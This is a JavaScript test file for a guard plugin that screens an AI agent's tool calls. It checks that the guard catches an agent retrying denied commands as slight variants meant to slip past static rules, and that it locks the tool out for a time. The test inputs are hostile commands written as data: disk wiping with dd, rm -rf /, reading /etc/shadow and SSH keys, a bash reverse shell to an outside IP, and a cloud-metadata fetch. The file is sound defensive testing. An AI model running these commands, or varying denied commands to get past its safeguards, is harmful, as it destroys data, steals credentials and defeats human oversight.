import { test } from 'node:test'
import assert from 'node:assert/strict'
import { Context } from 'cordis'
import * as plugin from '../lib/index.js'
import { FenceProbingTracker, tokenizeCall, jaccardSimilarity } from '../lib/fence-probing.js'

const { DEFAULT_RULES } = plugin

function makeCtx(config) {
  const root = new Context()
  root.plugin(plugin, config)
  return root
}
const wait = () => new Promise(r => setTimeout(r, 200))
const sleep = (ms) => new Promise(r => setTimeout(r, ms))
const isBlocked = (r) => typeof r === 'object' && r !== null && r.intercepted === true

// 单元测试公共参数（注入时钟；jailThreshold 提高避免误触监狱）
const base = { windowMs: 1000, similarity: 0.55, variants: 3, jailThreshold: 99, jailBaseMs: 100, jailMaxMs: 400 }

// ── 单元：tokenize / Jaccard ────────────────────────────
test('PRB 单元：tokenize 大小写归一、路径抹平、单字符噪声丢弃', () => {
  assert.deepEqual(tokenizeCall('cat /etc/shadow'), ['cat', 'etc', 'shadow'])
  assert.deepEqual(tokenizeCall('DD IF=/dev/zero'), ['dd', 'if', 'dev', 'zero'])
  assert.deepEqual(tokenizeCall('a b c'), [])
  assert.equal(jaccardSimilarity(new Set(['cat', 'etc', 'shadow']), new Set(['cat', 'etc', 'shadow'])), 1)
  assert.equal(jaccardSimilarity(new Set(['cat', 'etc', 'shadow']), new Set(['sudo', 'cat', 'etc', 'shadow'])), 0.75)
  assert.equal(jaccardSimilarity(new Set(['ls', 'tmp']), new Set(['cat', 'etc', 'shadow'])), 0)
})

// ── 单元：PRB-001 deny-retry ────────────────────────────
test('PRB-001 单元：被拒调用的扰动变体/原样重试命中，无关调用与跨工具不命中，窗口滑出自愈', () => {
  const tr = new FenceProbingTracker({ ...base })
  tr.record('bash', 'dd if=/dev/zero of=/dev/sda', 0)

  // 扰动变体：静态正则漏掉的 ./dev 写法，token 集相同
  let v = tr.assess('bash', 'dd if=/dev/zero of=./dev/sda', 10)
  assert.ok(v)
  assert.equal(v.ruleId, 'PRB-001')
  assert.equal(v.similarity, 1)

  // 无关调用：不相似
  assert.equal(tr.assess('bash', 'git status', 20), null)
  // 跨工具：同内容不同工具不比对（围栏记忆按工具隔离）
  assert.equal(tr.assess('fetch', 'dd if=/dev/zero of=/dev/sda', 30), null)
  // 原样重试同样命中（deny 后无视围栏重发）
  v = tr.assess('bash', 'dd if=/dev/zero of=/dev/sda', 40)
  assert.equal(v.ruleId, 'PRB-001')
  // 窗口滑出自愈
  assert.equal(tr.assess('bash', 'dd if=/dev/zero of=./dev/sda', 1001), null)
})

// ── 单元：PRB-002 fence-fuzz ────────────────────────────
test('PRB-002 单元：窗口内 3 个不同变体（变体按原文判重）触发模糊测试判定', () => {
  const tr = new FenceProbingTracker({ ...base })
  tr.record('bash', 'sudo cat /etc/shadow', 0)
  tr.record('bash', 'cat /etc//shadow', 10)
  const v = tr.assess('bash', 'cat /etc/./shadow', 20)
  assert.ok(v)
  assert.equal(v.ruleId, 'PRB-002')
  assert.equal(v.variants, 3)
  assert.equal(v.similarity, 1)
})

// ── 单元：PRB-003 tool-jail（注入时钟）──────────────────
test('PRB-003 单元：工具监狱按工具隔离、滑出自愈、时长指数递增且封顶', () => {
  const tr = new FenceProbingTracker({ ...base, jailThreshold: 2 })
  tr.record('bash', 'cat /etc/shadow', 0)
  tr.record('bash', 'ls /tmp', 1)                       // 同工具第 2 次被拒 → strikes=1，until=101

  let v = tr.assess('bash', 'echo hello', 50)           // 监狱期内：任何调用直接拦
  assert.ok(v)
  assert.equal(v.ruleId, 'PRB-003')
  assert.equal(v.jailUntil, 101)

  assert.equal(tr.assess('fetch', 'cat /etc/shadow', 60), null)   // 他工具不受牵连

  assert.equal(tr.assess('bash', 'echo hello', 102), null)        // 监狱到期自愈（内容不相似，strikes 清零）

  tr.record('bash', 'wget x', 200)                      // 出狱后再拒 → 重新收监 strikes=1，until=300
  v = tr.assess('bash', 'echo hi', 250)
  assert.equal(v.ruleId, 'PRB-003')
  assert.equal(v.jailUntil, 300)

  // 监狱期内持续施压（260/270/280 均 < 300，监狱未过期）：strikes 2/3/4 → 时长 200/400/800，封顶 400
  tr.record('bash', 'xx1', 260)
  tr.record('bash', 'xx2', 270)
  tr.record('bash', 'xx3', 280)
  v = tr.assess('bash', 'echo', 675)
  assert.equal(v.ruleId, 'PRB-003')
  assert.ok(v.jailUntil <= 280 + 400, '监狱时长不得超过封顶 jailMaxMs')
})

test('PRB 单元：stats 账本快照可观测', () => {
  const tr = new FenceProbingTracker({ ...base, jailThreshold: 2 })
  tr.record('bash', 'cat /etc/shadow', 0)
  tr.record('bash', 'ls /tmp', 1)
  tr.record('fetch', 'http://169.254.169.254/x', 2)
  const s = tr.stats(10)
  assert.equal(s.records, 3)
  assert.equal(s.byTool.bash, 2)
  assert.equal(s.byTool.fetch, 1)
  assert.equal(s.jails.length, 1)                       // bash 已收监
  assert.equal(s.jails[0].tool, 'bash')
  assert.ok(s.jails[0].strikes >= 1)
})

// ── 集成：拒后变体重试（静态规则漏掉的变体被围栏记忆拦住）──
test('PRB-001 集成：deny 后的扰动变体（静态正则漏掉）被围栏试探引擎拦截', async () => {
  const ctx = makeCtx(); await wait()
  const run = (t, p) => ctx.bail('guardian/check', t, p)
  const r1 = run('bash', 'dd if=/dev/zero of=/dev/sda')      // CMD-003 deny → 入账
  assert.ok(isBlocked(r1))
  const r2 = run('bash', 'dd if=/dev/zero of=./dev/sda')     // 静态不匹配 → PRB-001
  assert.ok(isBlocked(r2))
  assert.equal(r2.ruleId, 'PRB-001')
  assert.equal(r2.engine, 'probing')
})

// ── 集成：变体枚举 ─────────────────────────────────────
test('PRB-002 集成：同源被拒变体累计 3 个后升级为围栏模糊测试', async () => {
  const ctx = makeCtx(); await wait()
  const run = (t, p) => ctx.bail('guardian/check', t, p)
  assert.ok(isBlocked(run('bash', 'cat /etc/shadow')))       // CRED-003 deny → v1
  const r2 = run('bash', 'cat /etc//shadow')                 // 静态漏 → PRB-001 → v2
  assert.equal(r2.ruleId, 'PRB-001')
  const r3 = run('bash', 'cat /etc/./shadow')                // 相似 v1+v2 → 变体数 3
  assert.ok(isBlocked(r3))
  assert.equal(r3.ruleId, 'PRB-002')
  assert.equal(r3.engine, 'probing')
})

// ── 集成：工具监狱 + 自愈 ───────────────────────────────
test('PRB-003 集成：同工具连续被拒进入监狱，无辜调用一并拦，到期自愈', async () => {
  const ctx = makeCtx({ probing: { jailThreshold: 3, jailBaseMs: 400, jailMaxMs: 400 } }); await wait()
  const g = ctx.guardian
  const run = (t, p) => ctx.bail('guardian/check', t, p)
  assert.ok(isBlocked(run('bash', 'dd if=/dev/zero of=/dev/sda')))    // deny 1
  assert.ok(isBlocked(run('bash', 'rm -rf /')))                        // deny 2（互不相似）
  assert.ok(isBlocked(run('bash', 'bash -i >& /dev/tcp/1.2.3.4/4444')))// deny 3 → 收监

  const r4 = run('bash', 'echo hello')                       // 静态完全无害 → 监狱拦截
  assert.ok(isBlocked(r4))
  assert.equal(r4.ruleId, 'PRB-003')

  const s = g.fenceStats()                                   // 可观测性：监狱状态可见
  assert.equal(s.jails.length, 1)
  assert.equal(s.jails[0].tool, 'bash')

  assert.equal(isBlocked(run('fetch', 'https://example.com')), false)  // 他工具不受牵连

  await sleep(500)                                           // 监狱到期（封顶 400ms）
  assert.equal(isBlocked(run('bash', 'echo world')), false)  // 自愈：不再误伤
})

// ── 集成：人工批准越过 PRB 且不入账 ─────────────────────
test('PRB 语义：人工批准可越过围栏试探拦截，且批准不污染账本', async () => {
  const ctx = makeCtx(); await wait()
  const g = ctx.guardian
  const run = (t, p) => ctx.bail('guardian/check', t, p)
  assert.ok(isBlocked(run('read', '~/.ssh/id_rsa')))         // CRED-001 block 无 approve → 拦 + 入账

  ctx.on('guardian/approve', () => ({ approved: true }))     // 人工上线
  const r2 = run('read', '~/.ssh/id_rsa_backup')             // 相似度 0.8 → PRB-001 → 批准放行
  assert.equal(isBlocked(r2), false)
  assert.equal(g.fenceStats().records, 1)                    // 批准的调用不入账
})

// ── 集成：引擎开关 ─────────────────────────────────────
test('PRB 开关：detectProbing=false 时拒后变体重试放行（降级为纯静态）', async () => {
  const ctx = makeCtx({ detectProbing: false }); await wait()
  const run = (t, p) => ctx.bail('guardian/check', t, p)
  assert.ok(isBlocked(run('bash', 'dd if=/dev/zero of=/dev/sda')))
  assert.equal(isBlocked(run('bash', 'dd if=/dev/zero of=./dev/sda')), false)
})

// 引用避免 lint 噪声：确认导出面存在
test('PRB 导出：DEFAULT_RULES 与构建产物导出完整', () => {
  assert.ok(Array.isArray(DEFAULT_RULES) && DEFAULT_RULES.length > 0)
  assert.equal(typeof FenceProbingTracker, 'function')
  assert.equal(typeof tokenizeCall, 'function')
  assert.equal(typeof jaccardSimilarity, 'function')
})
